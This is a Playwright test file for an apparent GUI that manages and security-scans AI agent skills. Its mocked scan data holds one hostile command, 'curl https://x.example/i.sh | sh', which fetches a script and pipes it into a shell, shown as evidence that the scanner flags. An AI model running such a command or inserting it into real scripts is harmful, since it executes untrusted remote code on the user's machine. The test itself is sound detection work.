import { test, expect } from "@playwright/test";
import { injectWails, installedSkill, projectRoute, serviceCalls } from "./mock-wails";

const PROJECT = "/work/alpha";

const scans = [
  {
    skill: "shady",
    score: 75,
    level: "critical",
    files: 2,
    findings: [
      { rule: "pipe-to-shell", severity: "high", message: "downloads content and pipes it straight into a shell", file: "scripts/run.sh", line: 1, evidence: "curl https://x.example/i.sh | sh" },
    ],
  },
  { skill: "pdf", score: 0, level: "clean", files: 3, findings: [] },
];
const sigs = [
  { skill: "shady", status: "unsigned" },
  { skill: "pdf", status: "trusted", publisher: "acme" },
];

test.beforeEach(async ({ page }) => {
  await injectWails(page, {
    repos: [PROJECT],
    skell: {
      list: JSON.stringify([installedSkill("shady"), installedSkill("pdf")]),
      scan: JSON.stringify(scans),
      verify: JSON.stringify(sigs),
      "bundle list": JSON.stringify([{ name: "frontend", description: "UI pack", skills: ["pdf", "react"], installed: 1 }]),
      "trust list": JSON.stringify([{ publisher: "acme", key_id: "cc2be7d23c9d2993", public_key: "k", added_at: "" }]),
      test: JSON.stringify({ results: [], without_evals: ["pdf", "shady"] }),
      report: JSON.stringify({
        generated_at: "2026-10-21T10:00:00Z",
        summary: { repos: 1, installs: 2, unique_skills: 2, outdated: 0, modified: 0, pinned: 0, high_risk: 1, unsigned: 1, version_spread: 0, unhealthy_repos: 0 },
        repos: [{ path: PROJECT, name: "alpha", target: "claude", health: "healthy", errors: 0, warnings: 0, skills: [] }],
        matrix: [],
      }),
    },
  });
});

test("Security lists the riskiest skill first and explains what was found", async ({ page }) => {
  await page.goto(projectRoute(PROJECT, "/security"));
  await expect(page.getByRole("heading", { name: "Security for alpha" })).toBeVisible();
  await expect(page.getByRole("alert")).toContainText("1 skill needs a closer look");

  const rows = page.getByRole("button", { expanded: false });
  await expect(rows.first()).toContainText("shady");
  await rows.first().click();
  await expect(page.getByText("pipes it straight into a shell")).toBeVisible();
  await expect(page.getByText("curl https://x.example/i.sh | sh")).toBeVisible();
});

test("Bundles shows progress and installs what is missing", async ({ page }) => {
  await page.goto(projectRoute(PROJECT, "/bundles"));
  await expect(page.getByText("@frontend")).toBeVisible();
  await expect(page.getByText("1 of 2 installed")).toBeVisible();
  await page.getByRole("button", { name: "Install 1 missing skill" }).click();
  await expect
    .poll(async () => (await serviceCalls(page)).some((c) => c.method === "RunSkell" && (c.args[0] as string[]).slice(0, 3).join(" ") === "bundle install frontend"))
    .toBe(true);
});

test("Tests explains that a real agent is needed, and Settings is where to set it", async ({ page }) => {
  await page.goto(projectRoute(PROJECT, "/tests"));
  await expect(page.getByText(/None of the installed skills ship test cases/)).toBeVisible();

  await page.goto("/settings");
  await expect(page.getByRole("heading", { name: /Trusted publishers/ })).toBeVisible();
  await expect(page.getByText("acme")).toBeVisible();
  await page.getByRole("button", { name: "claude -p" }).click();
  await page.getByRole("button", { name: "Save" }).click();
  await expect(page.getByLabel("Agent command")).toHaveValue("claude -p");
});

test("Fleet summarises the projects", async ({ page }) => {
  await page.goto("/fleet");
  await expect(page.getByRole("heading", { name: "Fleet", exact: true })).toBeVisible();
  await expect(page.getByText("High-risk installs")).toBeVisible();
  await expect(page.getByRole("button", { name: /My projects \(1\)/ })).toHaveAttribute("aria-pressed", "true");
});
